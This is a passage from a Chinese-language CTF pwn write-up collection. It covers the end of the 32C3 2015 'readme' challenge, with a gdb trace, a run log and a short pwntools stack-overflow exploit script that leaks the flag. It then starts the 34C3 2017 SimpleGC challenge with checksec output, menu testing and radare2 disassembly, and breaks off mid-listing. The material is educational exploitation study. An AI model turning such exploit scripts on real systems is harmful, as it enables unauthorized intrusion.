0040| 0x7fffffffda18 --> 0x7fffffffda20 --> 0x7ffff7dd2620 --> 0
xfbad2887
0048| 0x7fffffffda20 --> 0x7ffff7dd2620 --> 0xfbad2887
0056| 0x7fffffffda28 --> 0x1
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
__libc_message (do_abort=do_abort@entry=0x1, fmt=fmt@entry=0x7ff
ff7b9c49f "*** %s ***: %s terminated\n")
1109
6.1.14 pwn 32C3CTF2015 readme
at ../sysdeps/posix/libc_fatal.c:81
81 ../sysdeps/posix/libc_fatal.c: No such file or directory.
Bingo!!!
$ python exp.py
[+] Opening connection to 127.0.0.1 on port 10001: Done
[+] Receiving all data: Done (703B)
[*] Closed connection to 127.0.0.1 port 10001
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA @.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere...
terminated
exploit
最终的 exp 如下：
1110
6.1.14 pwn 32C3CTF2015 readme
from pwn import *
io = remote("127.0.0.1", 10001)
#io = process('./readme.bin')
#context.log_level = 'debug'
payload_1 = "A"*0x218 + p64(0x400d20) + p64(0) + p64(0x600d20)
io.sendline(payload_1)
payload_2 = "LIBC_FATAL_STDERR_=1"
io.sendline(payload_2)
print io.recvall()
参考资料
https://ctftime.org/task/1958
https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-
2015/pwn/readme-200
1111
6.1.15 pwn 34C3CTF2017 SimpleGC
6.1.15 pwn 34C3CTF2017 SimpleGC
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file sgc
sgc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynami
cally linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/L
inux 2.6.32, BuildID[sha1]=f7ef90bc896e72ba0c3191a2ce6acb732bf3b
172, stripped
$ checksec -f sgc
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 4 sgc
$ strings libc-2.26.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.26-0ubuntu2) stable release versio
n 2.26, by Roland McGrath et al.
Compiled by GNU CC version 6.4.0 20171010.
一看 libc-2.26，请参考章节 4.14，tcache 了解一下。然后程序开启了 Canary 和
NX。
0: Add a user
1: Display a group
2: Display a user
3: Edit a group
4: Delete a user
5: Exit
Action: 1 # 假设两个 user 的 group 相同
1112
6.1.15 pwn 34C3CTF2017 SimpleGC
Enter group name: A
User:
Name: a
Group: A
Age: 1
User:
Name: b
Group: A
Age: 1
0: Add a user
1: Display a group
2: Display a user
3: Edit a group
4: Delete a user
5: Exit
Action: 3 # 修改 group，输入 y
Enter index: 0
Would you like to propagate the change, this will update the gro
up of all the users sharing this group(y/n): y
Enter new group name: B
0: Add a user
1: Display a group
2: Display a user
3: Edit a group
4: Delete a user
5: Exit
Action: 1 # 两个 user 的 group 都被修改
Enter group name: B
User:
Name: a
Group: B
Age: 1
User:
Name: b
Group: B
Age: 1
0: Add a user
1: Display a group
2: Display a user
3: Edit a group
1113
6.1.15 pwn 34C3CTF2017 SimpleGC
4: Delete a user
5: Exit
Action: 3 # 修改 group，输入 n
Enter index: 0
Would you like to propagate the change, this will update the gro
up of all the users sharing this group(y/n): n
Enter new group name: A
0: Add a user
1: Display a group
2: Display a user
3: Edit a group
4: Delete a user
5: Exit
Action: 1 # 仅当前 user 的 group 被修改
Enter group name: A
User:
Name: a
Group: A
Age: 1
0: Add a user
1: Display a group
2: Display a user
3: Edit a group
4: Delete a user
5: Exit
Action: 1
Enter group name: B
User:
Name: b
Group: B
Age: 1
玩一下，程序似乎有两个结构分别放置 user 和 group。而且 Edit 功能很有趣，根
据选择 y 还是 n 有不同的操作，应该重点看看。
题目解析
GC
1114
6.1.15 pwn 34C3CTF2017 SimpleGC
main 函数开始会启动一个新的线程，用于垃圾回收，然后才让我们输入菜单的选
项。刚开始 r2 并不能识别这个线程函数，用命令 af 给它重新分析一下。函数如
下：
[0x00400a60]> af @ 0x0040127e
[0x00400a60]> pdf @ fcn.0040127e
/ (fcn) fcn.0040127e 157
| fcn.0040127e (int arg_5fh);
| ; var int local_18h @ rbp-0x18
| ; var int local_8h @ rbp-0x8
| ; var int local_4h @ rbp-0x4
| ; arg int arg_5fh @ rbp+0x5f
| ; CALL XREF from 0x0040127e (fcn.0040127e)
| ; DATA XREF from 0x004014af (main)
| 0x0040127e push rbp
| 0x0040127f mov rbp, rsp
| 0x00401282 sub rsp, 0x20
| 0x00401286 mov qword [local_18h], rdi
| 0x0040128a mov edi, 1
| 0x0040128f call sym.imp.sleep
; int sleep(int s)
| 0x00401294 mov dword [local_4h], 0
| ; JMP XREF from 0x00401319 (fcn.0040127e)
| .-> 0x0040129b mov dword [local_8h], 0
; [local_8h] 为循环计数 i，初始化为 0
| ,== 0x004012a4 mov eax, dword [local_8h]
| :|: 0x004012a7 mov rax, qword [rax*8 + 0x6023e0]
; [0x6023e0:8]=0 ; 取出 groups[i]
| :|: 0x004012af test rax, rax
| ,====ref_count
| |:|: 0x004012c3 test al, al
| ,=====group_name
| ||:|: 0x004012d5 mov rdi, rax
| ||:|: 0x004012d8 call sym.imp.free
; void free(void *ptr) ; 释放掉 group_name
| ||:|: 0x004012dd mov eax, dword [local_8h]
| ||:|: 0x004012e0 mov rax, qword [rax*8 + 0x6023e0]
; [0x6023e0:8]=0 ; 取出 groups[i]
| ||:|: 0x004012e8 mov rdi, rax
| ||:|: 0x004012eb call sym.imp.free
; void free(void *ptr) ; 释放掉 groups[i]
| ||:|: 0x004012f0 mov eax, dword [local_8h]
| ||:|: 0x004012f3 mov qword [rax*8 + 0x6023e0], 0
; [0x6023e0:8]=0 ; 将 groups[i] 置 0
| ,====== 0x00401301 nop
| ||,==== 0x00401304 nop
| | |:|: ; JMP XREF from 0x00401302 (fcn.0040127e)
| | |:|: ; JMP XREF from 0x004012ff (fcn.0040127e)
| `-`----> 0x00401305 add dword [local_8h], 1
; 计数 + 1
| :|: ; JMP XREF from 0x004012a2 (fcn.0040127e)
| :`--> 0x00401309 cmp dword [local_8h], 0x5f
; [0x5f:4]=-1 ; '_' ; 95
| `===count 为 0 时，表示该 group 没有
user 在使用，于是对 groups[i]->group_name 和 groups[i] 分别进行 free 操作，最
后把 groups[i] 设置为 0。
最后需要注意的是垃圾回收的周期，在写 exp 的时候要考虑。
add a user
[0x00400a60]> pdf @ sub.memset_d58
/ (fcn) sub.memset_d58 598
| sub.memset_d58 ();
| ; var int local_162h @ rbp-0x162
| ; var int local_160h @ rbp-0x160
| ; var int local_15ch @ rbp-0x15c
| ; var int local_158h @ rbp-0x158
| ; var int local_150h @ rbp-0x150
| ; var int local_140h @ rbp-0x140
| ; var int local_120h @ rbp-0x120
| ; var int local_18h @ rbp-0x18
| ; CALL XREF from 0x0040153d (main)
| 0x00400d58 push rbp
| 0x00400d59 mov rbp, rsp
| 0x00400d5c push rbx
| 0x00400d5d sub rsp, 0x168
| 0x00400d64 mov rax, qword fs:[0x28]
; [0x28:8]=-1 ; '(' ; 40
| 0x00400d6d mov qword [local_18h], rax
1117
6.1.15 pwn 34C3CTF2017 SimpleGC
| 0x00400d71 xor eax, eax
| 0x00400d73 lea rax, [local_120h]
| 0x00400d7a mov edx, 0x100
; 256
| 0x00400d7f mov esi, 0
| 0x00400d84 mov rdi, rax
| 0x00400d87 call sym.imp.memset
; memset(local_120h, 0, 0x100)，用于存放 name
| 0x00400d8c lea rax, [local_150h]
| 0x00400d93 mov edx, 8
| 0x00400d98 mov esi, 0
| 0x00400d9d mov rdi, rax
| 0x00400da0 call sym.imp.memset
; memset(local_150h, 0, 8)，用于存放 age
| 0x00400da5 lea rax, [local_140h]
| 0x00400dac mov edx, 0x18